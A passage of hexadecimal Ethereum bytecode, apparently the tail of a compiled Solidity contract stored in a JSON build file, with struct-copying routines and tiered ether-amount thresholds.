01808311615151575b50505050508152602001601082018054806020026020016040519081016040528092919081815260200182805480156151bf57602002820191906000526020600020905b815481526001909101906020018083116151aa575b5050505050815260200160118201548152602001601282015481526020016013820154815260200160148201548152505090508060400151600160a060020a03166000141515615237576040810151845160018401938691811061521f57fe5b600160a060020a039092166020928302909101909101525b6060810151600160a060020a031615615278576060810151845160018401938691811061526057fe5b600160a060020a039092166020928302909101909101525b614f31565b509195945050505050565b60008060008060008061529a88615654565b94506152a5896156dc565b93506152b0876156dc565b92508385106152bf57836152c1565b845b91508183106152d057816152d2565b825b6002029998505050505050505050565b6152ea615a51565b600160a060020a0383166000908152600c602090815260408083208151815460026001821615610100026000190190911604601f810185900490940281016102c09081019093526102a0810184815285948594859485948594859491938492849184018282801561539c5780601f106153715761010080835404028352916020019161539c565b820191906000526020600020905b81548152906001019060200180831161537f57829003601f168201915b50505091835250506001820154600160a060020a039081166020808401919091526002840154821660408085019190915260038501548316606085015260048501549092166080840152600584015460a084015260068401805483518184028101840190945280845260c090940193909183018282801561544657602002820191906000526020600020905b8154600160a060020a03168152600190910190602001808311615428575b5050505050815260200160078201548152602001600882015481526020016009820160009054906101000a900460ff16151515158152602001600a8201548152602001600b8201548152602001600c8201548152602001600d8201548152602001600e8201548152602001600f820180548060200260200160405190810160405280929190818152602001828054801561550057602002820191906000526020600020905b815481526001909101906020018083116154eb575b505050505081526020016010820180548060200260200160405190810160405280929190818152602001828054801561555957602002820191906000526020600020905b81548152600190910190602001808311615544575b5050505050815260200160118201548152602001601282015481526020016013820154815260200160148201548152505097508760200151965089955060018860a0015103945060125485106155b1576012546155b3565b845b9350600092505b83831015613e3757600160a060020a038088166000908152600c602052604090206002810154909350811690871614156155fd576012820180548a019055615608565b6011820180548a0190555b61561187615756565b905081600701546003028111156156385761562d876000613699565b615638876000611fae565b600180830154600160a060020a031697965092909201916155ba565b60006801a055690d9db8000082101561566f575060006156d7565b680340aad21b3b700000821015615688575060016156d7565b6804e1003b28d92800008210156156a1575060026156d7565b68068155a43676e000008210156156ba575060036156d7565b680821ab0d44149800008210156156d3575060046156d7565b5060055b919050565b6000671bc16d674ec800008210156156f6575060006156d7565b673782dace9d90000082101561570e575060016156d7565b6753444835ec580000821015615726575060026156d7565b676f05b59d3b20000082101561573e575060036156d7565b678ac7230489e800008210156156d3575060046156d7565b6000615760615a51565b600160a060020a0383166000908152600c602090815260408083208151815460026001821615610100026000190190911604601f810185900490940281016102c09081019093526102a08101848152859485948594928492909184919084018282801561580e5780601f106157e35761010080835404028352916020019161580e565b820191906000526020600020905b8154815290600101906020018083116157f157829003601f168201915b50505091835250506001820154600160a060020a039081166020808401919091526002840154821660408085019190915260038501548316606085015260048501549092166080840152600584015460a084015260068401805483518184028101840190945280845260c09094019390918301828280156158b857602002820191906000526020600020905b8154600160a060020a0316815260019091019060200180831161589a575b5050505050815260200160078201548152602001600882015481526020016009820160009054906101000a900460ff16151515158152602001600a8201548152602001600b8201548152602001600c8201548152602001600d8201548152602001600e8201548152602001600f820180548060200260200160405190810160405280929190818152602001828054801561597257602002820191906000526020600020905b8154815260019091019060200180831161595d575b50505050508152602001601082018054806020026020016040519081016040528092919081815260200182805480156159cb57602002820191906000526020600020905b815481526001909101906020018083116159b6575b505050505081526020016011820154815260200160128201548152602001601382015481526020016014820154815250509450615a0787614629565b93508461010001519250615a1a8761338e565b9390920190920195945050505050565b60408051608081018252600080825260208201819052918101829052606081019190915290565b6102a060405190810160405280606081526020016000600160a060020a031681526020016000600160a060020a031681526020016000600160a060020a031681526020016000600160a060020a031681526020016000815260200160608152602001600081526020016000815260200160001515815260200160008152602001600081526020016000815260200160008152602001600081526020016060815260200160608152602001600081526020016000815260200160008152602001600081525090565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f10615b5957805160ff1916838001178555615b86565b82800160010185558215615b86579182015b82811115615b86578251825591602001919060010190615b6b565b50615b92929150615c70565b5090565b828054828255906000526020600020908101928215615beb579160200282015b82811115615beb5782518254600160a060020a031916600160a060020a03909116178255602090920191600190910190615bb6565b50615b92929150615c8d565b828054828255906000526020600020908101928215615b86579160200282015b82811115615b865782518255602090920191600190910190615c17565b6040805160e081018252600080825260208201819052918101829052606081018290526080810182905260a0810182905260c081019190915290565b615c8a91905b80821115615b925760008155600101615c76565b90565b615c8a91905b80821115615b92578054600160a060020a0319168155600101615c935600a165627a7a72305820a68210f77d441b03fa95b113c7d6f111fb51c1e219c7f71dfa0754a3ef0f29510029"
}